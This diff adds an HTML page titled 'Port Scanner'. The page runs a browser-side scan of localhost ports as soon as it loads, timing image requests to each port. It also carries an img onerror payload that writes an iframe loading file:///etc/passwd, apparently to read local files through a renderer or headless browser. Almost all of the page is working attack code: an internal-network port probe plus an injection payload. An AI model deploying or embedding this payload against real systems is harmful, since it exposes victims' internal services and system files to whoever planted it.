@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Port Scanner</title>
+  </head>
+  <body>
+    <img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+
+    <h2>
+      Total Execution Time:
+      <span id="executionTime">Calculating...</span> seconds
+    </h2>
+
+    <div id="results">
+      <h2>Scan Results:</h2>
+      <ul id="portList"></ul>
+    </div>
+
+    <script>
+      const TIMEOUT = 1000; // 2 seconds for each port
+      const CONCURRENT_REQUESTS = 4; // Number of concurrent requests
+      const results = [];
+
+      // Define either a range or a specific list of ports
+      //const PORT_RANGE = { start: 300, end: 500 };
+      //const SPECIFIC_PORTS = []; // e.g. [80, 443, 8080]
+      const SPECIFIC_PORTS = [
+        445, 4000, 80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 1521, 2082,
+        2087, 2095, 2096, 2480, 3000, 3128, 3306, 3307, 3333, 4243, 4567, 4711,
+        4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001,
+        8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172,
+        8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000,
+        9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080,
+        18091, 18092, 20720, 28017,
+      ];
+      //const SPECIFIC_PORTS = [8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281]
+
+      const portsToScan = SPECIFIC_PORTS.length
+        ? SPECIFIC_PORTS
+        : Array.from(
+            { length: PORT_RANGE.end - PORT_RANGE.start + 1 },
+            (_, i) => i + PORT_RANGE.start
+          );
+
+      function checkPort(port) {
+        return new Promise((resolve) => {
+          const img = new Image();
+          const startTime = Date.now();
+          const baseUrl = `http://localhost:${port}/image.jpg`;
+          //const baseUrl = `http://google.com`;
+
+          img.onload = img.onerror = function () {
+            const endTime = Date.now();
+            const duration = endTime - startTime;
+            results.push({ port, duration });
+            resolve();
+          };
+
+          setTimeout(() => {
+            // If no response after TIMEOUT, we just resolve and move on
+            resolve();
+          }, TIMEOUT);
+
+          img.src = baseUrl;
+        });
+      }
+
+      async function scanPorts() {
+        for (let i = 0; i < portsToScan.length; i += CONCURRENT_REQUESTS) {
+          const promises = portsToScan
+            .slice(i, i + CONCURRENT_REQUESTS)
+            .map((port) => checkPort(port));
+          await Promise.all(promises);
+        }
+
+        // Sorting results by response time
+        results.sort((a, b) => a.duration - b.duration);
+
+        displayResults();
+      }
+
+      const executionTimeElem = document.getElementById("executionTime");
+      const startTime = Date.now();
+
+      function displayResults() {
+        const portListElem = document.getElementById("portList");
+        results.forEach((result) => {
+          const li = document.createElement("li");
+          li.textContent = `Port ${result.port}: ${result.duration}ms`;
+          portListElem.appendChild(li);
+        });
+
+        const endTime = Date.now();
+        const totalTime = (endTime - startTime) / 1000;
+        executionTimeElem.textContent = totalTime.toFixed(2);
+      }
+
+      // Start the scan
+      scanPorts();
+    </script>
+  </body>
+</html>
